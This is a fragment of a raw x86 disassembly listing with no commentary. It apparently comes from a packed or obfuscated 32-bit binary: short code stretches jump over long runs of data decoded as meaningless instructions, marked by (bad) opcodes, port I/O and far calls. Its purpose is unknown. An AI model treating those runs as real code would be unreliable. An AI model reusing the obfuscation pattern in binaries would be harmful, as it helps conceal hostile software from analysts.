  40206f:	jnp    0x40203c
  402071:	mov    edx,DWORD PTR [ebp-0x20]
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42efa4,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e8da,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e8e2,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x167f2d7],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x40211a
  4020cf:	push   eax
  4020d0:	or     edi,edx
  4020d2:	ror    DWORD PTR [edi-0x1a],cl
  4020d5:	ins    DWORD PTR es:[edi],dx
  4020d6:	repz data16 and BYTE PTR [edx+0x5c],0x2e
  4020dc:	jno    0x40213a
  4020de:	inc    esp
  4020df:	mov    DWORD PTR [ebx-0x4b],ebx
  4020e2:	lds    esp,FWORD PTR [ebp-0x46]
  4020e5:	lahf   
  4020e6:	in     eax,dx
  4020e7:	clc    
  4020e8:	outs   dx,BYTE PTR ds:[esi]
  4020e9:	jecxz  0x402153
  4020eb:	mov    ds:0xdac4ca9b,al
  4020f0:	push   edi
  4020f1:	int    0xc
  4020f3:	dec    edi
  4020f4:	fnstcw WORD PTR [eax]
  4020f6:	mov    eax,edx
  4020f8:	cmp    BYTE PTR [eax+0x17186079],bl
  4020fe:	xchg   ecx,eax
  402100:	push   ds
  402101:	out    dx,al
  402102:	push   0xc48707b
  402107:	and    ecx,DWORD PTR [edx-0x4a]
  40210a:	mov    ebx,DWORD PTR [ebp+0x24]
  40210d:	push   esp
  40210e:	in     al,dx
  40210f:	adc    ebp,edi
  402111:	sub    ah,BYTE PTR [edi]
  402113:	pop    ebp
  402114:	fs dec ebx
  402116:	and    dl,BYTE PTR [edx]
  402118:	int    0x5e
  40211a:	mov    eax,0xa182c8eb
  40211f:	jle    0x40211d
  402121:	push   0xffffff9e
  402123:	cmp    al,0xee
  402125:	fidivr DWORD PTR [ebp+0x1f0532d]
  40212b:	aam    0xae
  40212d:	(bad)  
  40212e:	fstp   DWORD PTR [ebp+ebp*2+0x7e]
  402132:	and    edx,DWORD PTR [eax+0x243c23d9]
  402138:	mov    WORD PTR [ebx+0xa],es
  40213b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40213c:	into   
  40213d:	js     0x40212e
  40213f:	mov    ah,0x48
  402141:	out    0x56,al
  402143:	mov    cl,0x31
  402145:	loop   0x40219c
  402147:	jg     0x4021ba
  402149:	fwait
  40214a:	loop   0x40211d
  40214c:	jle    0x402145
  40214e:	dec    esi
  40214f:	xor    dh,cl
  402151:	icebp  
  402152:	adc    BYTE PTR [edx+0x109d58be],0xe0
  402159:	add    eax,0x6265f8c7
  40215e:	pop    edi
  40215f:	jecxz  0x402190
  402161:	dec    esi
  402162:	adc    eax,0x415721ef
  402167:	gs ret 0x4480
  40216b:	in     al,dx
  40216c:	sub    eax,0xa06aad8f
  402171:	(bad)  
  402173:	out    0x79,eax
  402175:	push   ebx
  402176:	(bad)  
  402177:	push   ebp
  402178:	(bad)  
  402179:	jns    0x40217e
  40217b:	mov    esp,0x5cf1ef15
  402180:	pop    ebx
  402181:	xor    eax,0x361b3828
  402186:	cmp    ebx,DWORD PTR [eax+0x63e65891]
  40218c:	and    DWORD PTR [esi+0x741bb0c4],edx
  402192:	out    0xba,eax
  402194:	xchg   ebp,eax
  402195:	cmp    esi,DWORD PTR [edi+edx*2]
  402198:	push   ss
  402199:	xchg   ebp,eax
  40219a:	jno    0x40215c
  40219c:	add    dl,BYTE PTR [ecx+0x6c]
  40219f:	dec    edi
  4021a0:	xor    dh,cl
  4021a2:	xchg   ecx,eax
  4021a3:	inc    edx
  4021a4:	jl     0x4021a2
  4021a6:	stc    
  4021a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021a8:	or     eax,0xbecd5e9d
  4021ad:	in     eax,dx
  4021ae:	dec    ebx
  4021af:	das    
  4021b0:	mov    bh,bl
  4021b2:	jne    0x402203
  4021b4:	adc    BYTE PTR [edx+eiz*2+0x30],0x95
  4021b9:	dec    edx
  4021ba:	shr    DWORD PTR [edx-0x6d887929],0x80
  4021c1:	add    dl,BYTE PTR ds:0x4137a1a
  4021c7:	retf   0x7c80
  4021ca:	out    0xf2,al
  4021cc:	push   esi
  4021cd:	sub    esi,DWORD PTR [edx]
  4021cf:	push   edx
  4021d0:	stos   BYTE PTR es:[edi],al
  4021d1:	in     eax,0x12
  4021d3:	or     DWORD PTR [esi-0x71],ecx
  4021d6:	sub    eax,0x5d8763d1
  4021db:	cmp    dl,BYTE PTR [esi+edx*8]
  4021de:	sbb    ch,ch
  4021e0:	jmp    0x1baf61f3
  4021e5:	popa   
  4021e6:	nop
  4021e7:	mov    bl,0x1a
  4021e9:	jp     0x40216f
  4021eb:	or     DWORD PTR [edx],esi
  4021ed:	rcr    bl,0x6e
  4021f0:	outs   dx,DWORD PTR ds:[esi]
  4021f1:	fwait
  4021f2:	ins    BYTE PTR es:[edi],dx
  4021f3:	sbb    BYTE PTR [edi+0x69],ch
  4021f6:	push   0xfffffffc
  4021f8:	addr16 inc edx
  4021fa:	mov    ecx,0x1b64c68c
  4021ff:	fwait
  402200:	jb     0x402272
  402202:	lock push 0xe67daafa
  402208:	sbb    BYTE PTR [ebp-0x7b],dh
  40220b:	add    al,0xea
  40220d:	(bad)  
  40220f:	push   esi
  402210:	add    dh,dl
  402212:	push   es
  402213:	add    BYTE PTR [esi+esi*4+0x50fc6f22],cl
  40221a:	push   0x793b647e
  40221f:	repz jbe 0x402287
  402222:	es loope 0x40223d
  402225:	aad    0xd8
  402227:	test   al,0xa0
  402229:	ins    DWORD PTR es:[edi],dx
  40222a:	pop    ecx
  40222b:	dec    edi
  40222c:	in     al,dx
  40222d:	push   ecx
  40222e:	push   DWORD PTR [edx-0x73]
  402231:	arpl   WORD PTR [ecx-0x7e013d0b],di
  402237:	loope  0x4021f9
  402239:	xchg   esp,eax
  40223a:	mov    gs,WORD PTR [ecx+0x21121558]
  402240:	rcl    BYTE PTR [edx+eax*8-0x5fee004f],cl
  402247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402248:	adc    DWORD PTR [eax],ebp
  40224a:	jmp    0xd608:0x2074c2f
  402251:	mov    eax,0xd2747721
  402256:	jg     0x4022a0
  402258:	fdivr  QWORD PTR [edx+ebp*1+0x4e56adeb]
  40225f:	cli    
  402260:	push   ebx
  402261:	icebp  
  402262:	push   ds
  402263:	pop    edi
  402264:	sub    dh,BYTE PTR [ecx-0x3d0f6f16]
  40226a:	add    dl,bl
  40226c:	mov    cl,BYTE PTR [esi+0x41b6b891]
  402272:	ror    DWORD PTR [eax+0x52],1
  402275:	leave  
  402276:	push   ebx
  402277:	mov    eax,ds:0xa85f7cec
  40227c:	mov    ds:0x3a6eb20e,al
  402281:	cs push ecx
  402283:	or     dl,BYTE PTR [ebx]
  402285:	fcom   DWORD PTR [edx-0x7c]
  402288:	or     dl,BYTE PTR [esi+eiz*1+0x1f400bec]
  40228f:	jge    0x40227b
  402291:	pop    ecx
  402292:	cmc    
  402293:	dec    esi
  402294:	dec    ebp
  402295:	and    bh,BYTE PTR [esi-0x614cee3e]
  40229b:	mov    ah,0x96
  40229d:	jmp    0x354eb40e
  4022a2:	clc    
  4022a3:	popa   
  4022a4:	sbb    DWORD PTR [ebx+edi*1],esp
  4022a7:	jge    0x4022b8
  4022a9:	pop    esp
  4022aa:	dec    ebp
  4022ab:	neg    edi
  4022ad:	mov    dh,0x9d
  4022af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022b0:	and    esi,DWORD PTR [esi-0x4]
  4022b3:	or     BYTE PTR [ebp-0x66],dl
  4022b6:	lahf   
  4022b7:	scas   eax,DWORD PTR es:[edi]
  4022b8:	push   ecx
  4022b9:	inc    edi
  4022ba:	and    edi,esi
  4022bc:	xchg   ebx,eax
  4022bd:	test   DWORD PTR [edi+0xade7036],esi
  4022c3:	aad    0x21
  4022c5:	jl     0x4022da
  4022c7:	sbb    BYTE PTR [esi],ch
  4022c9:	push   ebp
  4022ca:	test   DWORD PTR [ecx-0x44],eax
  4022cd:	retf   0x37b8
  4022d0:	cmp    al,0xf2
  4022d2:	clc    
  4022d3:	jge    0x402297
  4022d5:	cwde   
  4022d6:	fcom   QWORD PTR [edi-0x42c40c41]
  4022dc:	rcr    bh,cl
  4022de:	addr16 push ecx
  4022e0:	inc    ecx
  4022e1:	(bad)  
  4022e2:	pop    ebx
  4022e3:	je     0x40227e
  4022e5:	ins    BYTE PTR es:[edi],dx
  4022e6:	jp     0x40233b
  4022e8:	push   edi
  4022e9:	dec    edi
  4022ea:	push   ebx
  4022eb:	fdivr  QWORD PTR [eax]
  4022ed:	bound  ebx,QWORD PTR [esi-0x5760b7e1]
  4022f3:	sbb    eax,0x86454d84
  4022f8:	sub    eax,0x62514861
  4022fd:	dec    esi
  4022fe:	pop    ds
  4022ff:	sub    DWORD PTR [esi-0xa85bac4],ecx
  402305:	sub    edi,esp
  402307:	add    eax,0x5153c0de
  40230c:	(bad)  
  40230d:	pop    esi
  40230e:	jmp    0x3e16:0x6729830f
  402315:	adc    cl,BYTE PTR [ecx-0x28]
  402318:	jle    0x40235c
  40231a:	jbe    0x4022b3
  40231c:	retf   0x93b6
  40231f:	cmc    
  402320:	iret   
  402321:	mov    eax,ds:0xb869253e
  402326:	xchg   esp,eax
  402327:	mov    ds:0x1249ab19,al
  40232c:	int3   
  40232d:	sbb    ebp,DWORD PTR [esp+edx*8-0x34]
  402331:	es popa 
  402333:	dec    esi
  402334:	fsubr  QWORD PTR [ecx]
  402336:	fidivr DWORD PTR [esi]
  402338:	and    al,0x3a
  40233b:	test   eax,0xda2e6be2
  402340:	mov    al,0x8d
  402342:	pop    ecx
  402343:	adc    dl,BYTE PTR [ecx-0x70]
  402346:	stos   DWORD PTR es:[edi],eax
  402347:	lea    esi,[ebp+0x1cbffe34]
  40234d:	fdiv   QWORD PTR [ecx+0x3c]
  402350:	inc    eax
  402351:	xor    eax,0xf9d3b6c3
  402356:	mov    ds,WORD PTR [eax]
  402358:	or     BYTE PTR [edx],ah
  40235a:	sar    DWORD PTR [eax-0x18],0xd9
  40235e:	rcl    BYTE PTR [edi+0x33],cl
  402361:	pop    ss
  402362:	jle    0x402348
  402364:	(bad)  
  402365:	mov    dl,0x39
  402367:	inc    eax
  402368:	xchg   DWORD PTR [edx],ebx
  40236a:	xor    DWORD PTR ds:0x1cf450f4,0x65
  402371:	enter  0x398f,0xb6
  402375:	sbb    dh,BYTE PTR [ebx+esi*4]
  402378:	inc    esp
  402379:	add    cl,BYTE PTR ds:0x95ba9ea
  40237f:	inc    al
  402381:	test   BYTE PTR [edi-0x6082e27a],bh
  402387:	inc    ebx
  402388:	aaa    
  402389:	les    esi,FWORD PTR [eax+0x3d]
  40238c:	mov    ebp,0x921a977e
  402391:	push   esi
  402392:	dec    ebx
  402393:	nop
  402394:	aas    
  402395:	std    
  402396:	neg    dh
  402398:	xchg   ebx,eax
  402399:	ins    BYTE PTR es:[edi],dx
  40239a:	aas    
  40239b:	(bad)  [eax+0x44]
  40239e:	push   esp
  40239f:	or     DWORD PTR [ebx+0x985f0ca],edi
  4023a5:	and    eax,0xb6297ae4
  4023aa:	fisub  DWORD PTR [edx-0x24]
  4023ad:	xlat   BYTE PTR ds:[ebx]
  4023ae:	mov    BYTE PTR [edi+0x74],al
  4023b1:	cmp    DWORD PTR [ebx],esp
  4023b3:	repnz and bl,cl
  4023b6:	mov    cs,edi
  4023b8:	int    0x38
  4023ba:	add    al,0x73
  4023bc:	mov    esi,0x8694eaea
  4023c1:	pop    es
  4023c2:	aam    0xdb
  4023c4:	or     ecx,esp
  4023c6:	ins    BYTE PTR es:[edi],dx
  4023c7:	pop    ecx
  4023c8:	fwait
  4023c9:	pop    esi
  4023ca:	fsubrp st(7),st
  4023cc:	(bad)  
  4023cd:	jno    0x4023f4
  4023cf:	xor    al,0x75
  4023d1:	mov    eax,ds:0xbd6478a0
  4023d6:	add    al,BYTE PTR [ecx]
  4023d8:	ret    0x7fb
  4023db:	dec    esi
  4023dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023dd:	sbb    esi,eax
  4023df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023e0:	js     0x402398
  4023e2:	fwait
  4023e3:	popf   
  4023e4:	aad    0x1f
  4023e6:	xchg   BYTE PTR [edx+0x12193de0],dh
  4023ec:	and    al,0x60
  4023ee:	xlat   BYTE PTR ds:[ebx]
  4023ef:	enter  0x5f3a,0xad
  4023f3:	push   esi
  4023f4:	mov    cs,WORD PTR ds:[eax]
  4023f7:	lods   al,BYTE PTR ds:[esi]
  4023f8:	lock pop esp
  4023fa:	cli    
  4023fb:	pop    ds
  4023fc:	(bad)  
  4023fd:	sbb    al,0x83
  4023ff:	jae    0x402412
  402401:	fwait
  402402:	inc    esp
  402403:	push   0xffffffe3
  402405:	jl     0x402393
  402407:	popa   
  402408:	push   esi
  402409:	jae    0x402413
  40240b:	dec    esi
  40240c:	inc    eax
  40240d:	push   es
  40240e:	pop    es
  40240f:	mov    dl,0xec
  402411:	mov    bh,0xe9
  402413:	outs   dx,BYTE PTR ds:[esi]
  402414:	aad    0x54
  402416:	je     0x402414
  402418:	xor    DWORD PTR [ecx+0x74ef5144],edi
  40241e:	or     ch,cl
  402420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402422:	imul   ecx,esi,0x1
  402425:	sub    ecx,DWORD PTR [edi+0x4b82e631]
  40242b:	sub    BYTE PTR [edx+0x10c392bd],ch
  402431:	add    al,0x84
  402433:	sar    BYTE PTR [esi+esi*1-0x4faa1f38],cl
  40243a:	call   0xae981a4e
  40243f:	xchg   BYTE PTR [edi+esi*4+0x581b6927],dh
  402446:	and    al,0x1f
  402448:	xor    DWORD PTR [eax],ebp
  40244a:	pop    ecx
  40244b:	ds inc esi
  40244d:	jo     0x40242b
  40244f:	xor    eax,0xd07f1f1
  402454:	(bad)  
  402455:	jbe    0x40249d
  402457:	inc    esi
  402458:	xor    ebx,0x33
  40245b:	stos   DWORD PTR es:[edi],eax
  40245c:	shl    BYTE PTR [esi],1
  40245e:	hlt    
  40245f:	rcl    DWORD PTR [esi],0x70
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x4306c6,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x43063e,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x43063a,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	sub    bl,ah
  4024b4:	loop   0x40249b
  4024b6:	push   edx
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x4024c8
  4024bf:	push   ebx
  4024c0:	std    
  4024c1:	adc    ah,0xac
  4024c4:	sub    al,0x23
  4024c6:	adc    al,0x81
  4024c8:	xor    esi,esp
  4024ca:	in     al,0xa3
  4024cc:	inc    ecx
  4024cd:	test   esp,ebx
  4024cf:	adc    esp,DWORD PTR [ecx]
  4024d1:	or     al,0x4
  4024d3:	iret   
  4024d4:	arpl   WORD PTR [edi],cx
  4024d6:	outs   dx,BYTE PTR ds:[esi]
  4024d7:	xchg   edi,eax
  4024d8:	out    0x10,eax
  4024da:	out    0xfb,eax
  4024dc:	aad    0x6d
  4024de:	pusha  
  4024df:	fnstcw WORD PTR [ecx-0x45a4c496]
  4024e5:	std    
  4024e6:	mov    al,ds:0xf9fd8029
  4024eb:	pop    ebp
  4024ec:	cmp    BYTE PTR [edi+eax*1-0x5462f537],dl
  4024f3:	icebp  
  4024f4:	fisubr WORD PTR [edx]
  4024f6:	mov    dl,0xff
  4024f8:	call   0xc8c1:0x7cb4f630
  4024ff:	sahf   
  402500:	imul   eax,DWORD PTR [ebp+0x6a7546da],0x3
  402507:	aad    0xeb
  402509:	push   ss
  40250a:	jmp    0xc85:0x98b60559
  402511:	push   ds
  402512:	inc    esi
  402513:	loope  0x402580
  402515:	adc    DWORD PTR [ebx],ebp
  402517:	xchg   edi,eax
  402518:	pop    es
  402519:	inc    eax
  40251a:	lea    esi,[ecx+0x61]
  40251d:	mov    DWORD PTR [esp+eiz*4],edx
  402520:	cli    
  402521:	push   0x4b
  402523:	out    0xf1,al
  402525:	push   esi
  402526:	push   esp
  402527:	jp     0x40255e
  402529:	aaa    
  40252a:	xor    edx,DWORD PTR [ecx]
  40252c:	retf   
  40252d:	cmc    
  40252e:	(bad)  
  40252f:	(bad)  
  402530:	xor    BYTE PTR [esi+0x3],bh
  402533:	(bad)  
  402534:	sub    al,0xae
  402536:	sbb    edx,DWORD PTR [edx+0x1b878518]
  40253c:	arpl   WORD PTR [edi-0x21422464],ax
  402542:	cmp    eax,0x2716078d
  402547:	out    dx,eax
  402548:	mov    ah,0x2a
  40254a:	loope  0x402576
  40254c:	or     BYTE PTR ss:[edx],bh
  40254f:	das    
  402550:	push   edi
  402551:	jns    0x4024ee
  402553:	jle    0x402528
  402555:	push   ebx
  402556:	js     0x402595
  402558:	xchg   esp,eax
  402559:	xchg   edx,eax
  40255a:	loop   0x402572
  40255c:	popf   
  40255d:	jno    0x402503
  40255f:	pop    esp
  402560:	test   BYTE PTR [edi],ah
  402562:	popf   
  402563:	pushf  
  402564:	(bad)  
  402565:	cmp    ecx,DWORD PTR [eax-0x46553322]
  40256b:	xor    eax,0x8f745867
  402570:	mov    al,ds:0x575c7d7d
  402575:	push   ds
  402576:	outs   dx,BYTE PTR ds:[esi]
  402577:	mov    cl,0x4a
  402579:	push   0x37
  40257b:	sbb    DWORD PTR [eax+0x5a],eax
  40257e:	mov    al,0x25
  402580:	int    0xc5
  402582:	mul    BYTE PTR [di]
  402585:	test   eax,0xa9a64eb3
  40258a:	fs jbe 0x402512
  40258d:	pop    edi
  40258e:	dec    ecx
  40258f:	xor    ch,BYTE PTR [esi+0x856b271]
  402595:	dec    esi
  402596:	stos   DWORD PTR es:[edi],eax
  402597:	test   al,0xf9
  402599:	mov    dh,0x1e
  40259b:	les    ebx,FWORD PTR [ecx]
  40259d:	mov    ecx,0x92293d5e
  4025a2:	imul   ecx,DWORD PTR [edi+0x242f118a],0x6dfb97d6
  4025ac:	mov    ds:0x55f1425,al
  4025b1:	xor    eax,0x5cca706e
  4025b6:	dec    ebp
  4025b7:	scas   al,BYTE PTR es:[edi]
  4025b8:	xchg   esp,eax
  4025b9:	push   ebp
  4025ba:	or     al,0x60
  4025bc:	popf   
  4025bd:	(bad)  
  4025be:	xchg   ebp,eax
  4025bf:	jno    0x402619
  4025c1:	sub    edx,DWORD PTR [esi]
  4025c3:	jo     0x4025be
  4025c5:	jmp    0x639c6fa0
  4025ca:	jns    0x40261a
  4025cc:	or     cl,BYTE PTR [eax]
  4025ce:	outs   dx,BYTE PTR ds:[esi]
  4025cf:	push   ss
  4025d0:	add    eax,0xd88b2162
  4025d5:	pop    ss
  4025d6:	mov    ecx,0x94a2ebc9
  4025db:	fiadd  WORD PTR [ecx+0x2]
  4025de:	aaa    
  4025df:	mov    ebp,0x27aebcd4
  4025e4:	(bad)  
  4025e5:	lds    edx,FWORD PTR [ebp+0x65]
  4025e8:	xchg   BYTE PTR [ebp+0x6b],al
  4025eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025ec:	push   0x9b30e2db
  4025f1:	cwde   
  4025f2:	sub    BYTE PTR [edx+0x392007bb],dh
  4025f8:	ss mov edi,0xf325b029
  4025fe:	sub    DWORD PTR [ecx-0x56],edx
  402601:	int    0x97
  402603:	xlat   BYTE PTR ds:[ebx]
  402604:	call   0xc83f:0xbda12f7b
  40260b:	pop    esi
  40260c:	jb     0x4025f5
  40260e:	aad    0xfd
  402610:	ror    dh,cl
  402612:	lods   eax,DWORD PTR ds:[esi]
  402613:	mov    edi,0x18267927
  402618:	mov    cs,WORD PTR [ecx+edi*4]
  40261b:	xor    DWORD PTR [edx+0x284339a],ebx
  402621:	aas    
  402622:	dec    esi
  402623:	test   eax,0xa02e7e21
  402628:	cdq    
  402629:	(bad)
  40262c:	jns    0x402680
  40262e:	aam    0x6f
  402630:	in     al,0x72
  402632:	sbb    ebx,DWORD PTR [edx-0x4a]
  402635:	dec    edi
  402636:	and    eax,0xd904752f
  40263b:	and    BYTE PTR [edi],bh
  40263d:	test   BYTE PTR [edi],bh
  40263f:	xor    edx,DWORD PTR [ebx]
  402641:	dec    esp
  402642:	adc    ecx,DWORD PTR [edx]
  402644:	fistp  DWORD PTR [ebp-0x7d]
  402647:	mov    esi,0x31e87c2f
  40264c:	sub    ecx,ebx
  40264e:	pop    edi
  40264f:	pop    eax
  402650:	pop    ebx
  402651:	cmp    al,0x46
  402653:	cmp    ebp,edi
  402655:	call   0x94fc:0xe55dcace
  40265c:	outs   dx,DWORD PTR cs:[esi]
  40265e:	dec    esp
  40265f:	mov    eax,ds:0x64386158
  402664:	jecxz  0x4026bd
  402666:	lds    ecx,FWORD PTR [ebx+edx*1-0x64]
  40266a:	pop    ebp
  40266b:	mov    dh,0x7
  40266d:	popa   
  40266e:	int    0xfd
  402670:	inc    ebx
  402671:	push   eax
  402672:	dec    ebx
  402673:	add    BYTE PTR [eax],ch
  402675:	pop    edi
  402676:	fucomi st,st(2)
  402678:	in     al,dx
  402679:	jp     0x4026da
  40267b:	jno    0x402647
  40267d:	adc    esp,edi
  40267f:	fmul   st(6),st
  402681:	gs mov bh,0x24
  402684:	or     ebp,DWORD PTR [edi+0x726cf0c3]
  40268a:	sub    dh,BYTE PTR [edi-0x4b45fec7]
  402690:	push   cs
  402691:	xchg   ecx,eax
  402692:	bound  esi,QWORD PTR [ebx-0x7ac3faed]
  402698:	scas   eax,DWORD PTR es:[edi]
  402699:	cmp    cl,cl
  40269b:	cmp    esi,DWORD PTR [eax+0x29]
  40269e:	ins    DWORD PTR es:[edi],dx
  40269f:	sub    DWORD PTR [eax],edi
  4026a1:	fistp  WORD PTR [edi+0x67fa506a]
  4026a7:	sub    eax,0xa1590a1b
  4026ac:	mov    esp,0x730697bd
  4026b1:	sub    BYTE PTR [ecx],al
  4026b3:	pop    edx
  4026b4:	cs jne 0x402708
  4026b7:	mov    bl,0xfd
  4026b9:	sub    BYTE PTR [eax],ch
  4026bb:	jge    0x40265f
  4026bd:	cmp    eax,0xcfba067f
  4026c2:	out    dx,eax
  4026c3:	jbe    0x40269f
  4026c5:	(bad)  
  4026c6:	fwait
  4026c7:	xor    ah,ch
  4026c9:	xchg   esp,eax
  4026ca:	add    ebp,DWORD PTR [bx+0x48]
  4026ce:	fs xchg edx,eax
  4026d0:	aad    0x95
  4026d2:	adc    bl,dl
  4026d4:	(bad)  
  4026d5:	mov    al,ds:0x53adfe1f
  4026da:	inc    ebx
  4026db:	pop    esi
  4026dc:	(bad)  
  4026dd:	jmp    0xd92bee8b
  4026e2:	mov    esp,0x28795e06
  4026e7:	push   eax
  4026e8:	jnp    0x402741
  4026ea:	retf   
  4026eb:	call   0xa179:0xe0c27532
  4026f2:	pop    edi
  4026f3:	xchg   esi,edi
  4026f5:	mov    DWORD PTR [ebx-0x64],0xff8f641c
  4026fc:	mov    bl,0xa6
  4026fe:	jno    0x402738
  402700:	push   es
  402701:	mov    edi,0x44ad112f
  402706:	jo     0x40272f
  402708:	arpl   WORD PTR [ecx+0x729aef3b],bp
  40270e:	iret   
  40270f:	fst    QWORD PTR ds:0x875b35b7
  402715:	repz pusha 
  402717:	loopne 0x402724
  402719:	div    BYTE PTR [edx-0x15]
  40271c:	and    DWORD PTR [edx-0x6f31667e],ebx
  402722:	stc    
  402723:	ja     0x4026cd
  402725:	or     eax,0x3c981b44
  40272a:	ss cmp al,0x1c
  40272d:	sbb    eax,0x95af8569
  402732:	push   0x797f400a
  402737:	xor    eax,0x8a19bc75
  40273c:	sbb    DWORD PTR [edx+0x790bebe2],ebx
  402742:	stos   BYTE PTR es:[edi],al
  402743:	mov    ah,0x7e
  402745:	out    0x8f,al
  402747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402748:	lahf   
  402749:	stc    
  40274a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40274b:	(bad)
  40274e:	sbb    ebp,DWORD PTR [eax]
  402750:	sbb    DWORD PTR [ecx],eax
  402752:	aam    0xc7
  402754:	jl     0x402704
  402756:	inc    edi
  402757:	addps  xmm7,XMMWORD PTR [ebp-0x73]
  40275b:	mov    ch,0x63
  40275d:	jl     0x4026ef
  40275f:	push   0xffffffc9
  402761:	ss in  eax,dx
  402763:	cmp    BYTE PTR [esp+edx*2+0x16],bl
  402767:	int3   
  402768:	mov    eax,?
  40276a:	in     eax,0x66
  40276c:	ret    
  40276d:	pusha  
  40276e:	(bad)
  402771:	mov    ch,0x48
  402773:	jns    0x40272b
  402775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402776:	shl    BYTE PTR [ebx+eax*2-0x1a203b6a],1
  40277d:	and    BYTE PTR [edx-0x38],ah
  402780:	mov    BYTE PTR [ebx+0x4cd86b6e],bh
  402786:	or     DWORD PTR [edi-0x62],ecx
  402789:	aad    0x12
  40278b:	pop    edi
  40278c:	and    ebx,ebx
  40278e:	dec    eax
  40278f:	mov    cl,0xd3
  402791:	push   0xed99fd81
  402796:	xchg   ebp,eax
  402797:	inc    esp
  402798:	xlat   BYTE PTR ds:[ebx]
  402799:	xor    dl,BYTE PTR [esi]
  40279b:	jbe    0x402761
  40279d:	mov    ds:0xa9b1622a,al
  4027a2:	inc    eax
  4027a3:	dec    eax
  4027a4:	or     edi,DWORD PTR [eax+0x6a]
  4027a7:	xor    ebx,DWORD PTR [esi]
  4027a9:	sub    esp,DWORD PTR [ecx+esi*4]
  4027ac:	fs mov ebp,0x6171c21a
  4027b2:	out    dx,eax
  4027b3:	inc    ebx
  4027b4:	adc    eax,0x94d3c7e3
  4027b9:	je     0x402751
  4027bb:	mov    eax,0x69daf882
  4027c0:	dec    DWORD PTR [esi]
  4027c2:	out    dx,eax
  4027c3:	jp     0x40280e
  4027c5:	adc    esi,DWORD PTR [ebx]
  4027c7:	inc    esp
  4027c8:	outs   dx,DWORD PTR ds:[esi]
  4027c9:	jns    0x4027e1
  4027cb:	jmp    0x40281b
  4027cd:	out    0x1f,eax
  4027cf:	lods   al,BYTE PTR ds:[esi]
  4027d0:	cli    
  4027d1:	jns    0x4027b0
  4027d3:	clc    
  4027d4:	cmp    DWORD PTR [ebx],ebx
  4027d6:	add    eax,0x1957c790
  4027db:	sbb    eax,DWORD PTR [ebp+0x5ae3d3c]
  4027e1:	retf   
  4027e2:	adc    BYTE PTR [edx+0x39],bl
  4027e5:	xor    eax,0x7afa4c5
  4027ea:	cs add ebx,ebp
  4027ed:	jle    0x4027e7
  4027ef:	mov    dh,0xce
  4027f1:	xchg   BYTE PTR [edx+edx*2-0x4b],ah
  4027f5:	int    0x1
  4027f7:	mov    edi,0x9bbe526f
  4027fc:	hlt    
  4027fd:	out    dx,eax
  4027fe:	add    al,0xbd
  402800:	test   DWORD PTR ds:0xe2f39d2d,0x1b5daad8
  40280a:	cmc    
  40280b:	nop
  40280c:	shr    esi,1
  40280e:	out    dx,eax
  40280f:	repz add edi,0x24
  402813:	cdq    
  402814:	add    DWORD PTR [edi-0x1579fdb],ebx
  40281a:	sbb    BYTE PTR [edi],0xa7
  40281d:	std    
  40281e:	dec    esi
  40281f:	neg    BYTE PTR [ecx+ebp*4]
  402822:	(bad)  
  402823:	jmp    0x40280e
  402825:	retf   
  402826:	fcomip st,st(5)
  402828:	push   ds
  402829:	lods   eax,DWORD PTR ds:[esi]
  40282a:	and    al,0x18
  40282c:	ss push 0xffffffd1
  40282f:	jg     0x4027b8
  402831:	push   ecx
  402832:	repnz not BYTE PTR [esi+0x43]
  402836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402837:	cld    
  402838:	cmp    esp,ebx
  40283a:	pop    ds
  40283b:	push   0xffffffb9
  40283d:	mov    ds:0xef9e2a29,eax
  402842:	sti    
  402843:	push   cs
  402844:	or     eax,0x14515b91
  402849:	jge    0x4028ae
  40284b:	inc    esp
  40284c:	(bad)  
  40284f:	lahf   
  402850:	in     al,dx
  402851:	pop    esp
  402852:	or     DWORD PTR [eax],0x60751c9e
  402858:	mov    DWORD PTR ds:0x42e8de,0x14
  402862:	cmp    DWORD PTR ds:0x42e8de,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e8de,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
